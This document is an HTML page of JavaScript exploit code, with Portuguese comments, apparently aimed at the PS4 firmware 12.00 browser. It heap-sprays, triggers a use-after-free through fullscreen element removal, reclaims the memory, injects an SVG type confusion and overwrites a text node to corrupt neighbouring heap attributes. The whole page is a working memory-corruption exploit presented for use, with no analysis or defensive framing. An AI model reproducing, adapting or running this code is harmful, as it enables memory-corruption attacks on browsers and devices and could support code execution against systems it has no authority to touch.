<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Precision Size Class Strike</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Precision Bucket Strike → Attribute Scan</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 🌍 PRECISION SPRAY (ALINHAMENTO DE BUCKETS)
function setupPrecisionSpray(){
    log("[*] Iniciando Spray de Precisao (Size Classes)...");
    
    window.attr_spray = [];
    
    for(let i=0; i<6000; i++){
        let d = document.createElement("div");
        // Isca com exatos 512 caracteres "B" (Bucket de 1024 bytes em UTF-16)
        d.setAttribute("data-pwn", "B".repeat(512));
        document.body.appendChild(d);
        window.attr_spray.push(d);
    }
    log("[*] Spray de atributos concluido: " + window.attr_spray.length);
}

// ==========================
// HEAP SETUP ORIGINAL (100% INALTERADO - Mantém a estabilidade do bug)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");
    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    Object.assign(fsTarget.style,{
        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
    });
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();
    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (100% INALTERADO)
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">AAAA</div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 PROBE DE PRECISÃO
function domOverlapProbe(fsTarget){
    log("---- PRECISION PROBE ----");

    try{
        let n = fsTarget.firstChild;
        if(!n) return;

        if(n.nodeType === 3){
            log("[!!!] TEXTNODE CONFUSION");

            // 💣 DISPARA O TIRO DE PRECISÃO
            try{
                // Tamanho de 512 (preenche o bloco) + 64 (invade o bloco do vizinho)
                // Usamos "X" para fácil identificação
                n.data = "X".repeat(512 + 64); 
                log("[PWN] Overwrite de precisao disparado");
            }catch(e){
                log("[UAF] write crash");
            }

            // ==========================
            // 🔥 SCANNER DOS ATRIBUTOS
            try{
                for(let i=0; i<window.attr_spray.length; i++){
                    let val = window.attr_spray[i].getAttribute("data-pwn");
                    
                    // Se o atributo não for mais uma sequência pura de "B"s, ACERTAMOS!
                    if(val && val.includes("XXXX")){
                        log("[$$$] JACKPOT FASTMALLOC! Atributo corrompido @ " + i);
                        log("[$$$] Prévia: " + val.substring(0, 30) + "...");
                        return; // Achamos o furo, para o scan!
                    }
                }
                log("[SCAN] Nada atingido neste bucket.");

            }catch(e){
                log("[UAF] scan crash");
            }
        }
    }catch(e){
        log("[UAF] probe crash");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");
    try{
        fsTarget.remove();
        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
    }catch(e){}

    let sizes=[1500,2000,2500,3000];
    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 180);
    setTimeout(()=>domOverlapProbe(fsTarget), 280);

    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
    setTimeout(()=>location.reload(), 600);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste...");
    
    window.heap_press = setupHeap(); 

    // Planta as iscas perfeitamente calibradas
    setupPrecisionSpray(); 

    let fsTarget=setupFullscreen();
    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
